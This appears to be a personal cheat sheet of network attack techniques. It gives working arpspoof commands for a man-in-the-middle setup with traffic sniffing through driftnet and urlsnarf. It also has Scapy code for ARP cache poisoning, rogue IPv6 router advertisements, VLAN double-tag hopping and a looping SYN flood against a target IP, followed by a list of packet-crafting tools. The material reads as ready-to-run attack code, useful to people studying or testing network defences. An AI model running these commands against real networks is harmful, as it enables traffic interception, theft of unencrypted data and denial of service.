# Arp Spoofing
```shell
sudo apt-get install dsniff             #This will install arpspoof
sudo apt-get install driftnet         # Driftnet will capture images over the wire
```
# Need to enable ip forwarding for ipv4 to have the system act as a router. 
```shell 
echo 1 > /proc/sys/net/ipv4/ip_forward
    or
sysctl -w net.ipv4.ip_forward=1

rpspoof -i (eth0) -t (target to send spoof to) (address you are spoofing)

#Setup arpspoof to posion 10.0.0.103 to tell him you are 10.0.0.104.
arpspoof -i eth0 -t 10.0.0.103 10.0.0.104
#Setup arpspoof to poison 10.0.0.104 to tell him you are 10.0.0.103.
arpspoof -i eth0 -t 10.0.0.104 10.0.0.103
#As 'proof of concept' we will use driftnet to capture unencrypted images sent over the wire.
driftnet -i eth0
#Also as 'proof of concept' we will use urlsnarf which will capture any URLs it sees over the wire,
urlsnarf -i eth0
```
# Packet Manipulation
```shell
# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
a = Ether()
a.src= "Your MAC"
a.dst= "Victim 1 MAC"
a.type= 0x0806

b = ARP()
b.op= 2
b.hwsrc= "Your MAC"
b.psrc= "Victim 2 IP"    #Who you are pretending to be
b.hwdst= "Victim 1 MAC"  #Who's ARP cache you are trying to poison
b.pdst= "Victim 1 IP"    #Who's ARP cache you are trying to poison

# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
c = Ether()
c.src= "Your MAC"
c.dst= "Victim 2 MAC"
c.type= 0x0806

d = ARP()
d.op= 2
d.hwsrc= "Your MAC"
d.psrc= "Victim 1 IP"    #Who you are pretending to be
d.hwdst= "Victim 2 MAC"  #Who's ARP cache you are trying to poison
d.pdst= "Victim 2 IP"    #Who's ARP cache you are trying to poison

a.show()
b.show()
c.show()
d.show()

sendp(a/b); sendp(c/d)
#sendp = send RAW socket from a modified L2 header and up
```
# Scapy for SLAAC ICMPv6:
```shell
a = IPv6()
a.dst = "ff02::1"

b = ICMPv6ND_RA()

c = ICMPv6NDOptSrcLLAddr()
c.lladdr = "your MAC"    #This is to add to their ARP cache

d = ICMPv6NDOptMTU()

e = ICMPv6NDOptPrefixInfo()
e.prefixlen= 64
e.prefix= "2001:abcd:1234:abcd::"  #Can be any prefix that is not reserved already

a.show()
b.show()
c.show()
d.show()
e.show()

send(a/b/c/d/e)
#send = send a RAW Socket with a stardards L2 header but L3 and up are modified.
```
# Scapy for VLAN:
```shell
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"
a.src="01:02:03:aa:bb:cc"
a.type=0x8100            #VLAN Tag will Follow

b=Dot1Q()
b.vlan=1                #Native VLAN
b.type=0x8100            #Another VLAN Tag will Follow

c=Dot1Q()
c.vlan=20                #Target VLAN
c.type=0x0800            #IPv4 or any other Ethertype that is encapsulated

d=IP()
d.proto=6                #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
d.src="10.10.0.40"      #Any source IP
d.dst="172.16.82.106"    #Target IP

e=TCP()
e.sport=54321
e.dport=80

f="message"

a.show()
b.show()
c.show()
d.show()
e.show()

sendp(a/b/c/d/e/f)
```
# Scapy SYN Flood:
```shell
a=IP()
a.proto=6              #specifies that TCP is encapsulated
a.src="10.10.0.40"    #Any source IP
a.dst="172.16.82.106"  #Target IP

b=TCP()
b.sport=RandShort()    #Randomizes Sport
b.dport=80            #Target Dport
b.flags="S"            #use SYN flag

a.show()
b.show()

send(a/b, loop=1, verbose=0)        #loop until ctrl+c
```
Other Packet Crafting tools 
https://resources.infosecinstitute.com/topic/15-best-free-packet-crafting-tools/#gref

Hping - http://www.hping.org/
Ostinato - http://ostinato.org/
Libcrafter - https://code.google.com/p/libcrafter/
Yersinia  - http://www.yersinia.net | https://tools.kali.org/vulnerability-analysis/yersinia | https://github.com/tomac/yersinia
packETH - http://packeth.sourceforge.net/
Colasoft Packet Builder - http://www.colasoft.com/download/products/download_packet_builder.php
Bit-Twist - http://bittwist.sourceforge.net/
Libtins - http://libtins.github.io/
WireEdit - https://wireedit.com/downloads.html
epb – Ethernet Packet Bombardier - http://maz-programmersdiary.blogspot.fi/2012/05/epb-ethernet-package-bombardier.html
Fragroute - http://www.monkey.org/~dugsong/fragroute/
Mausezahn -    http://www.perihel.at/sec/mz/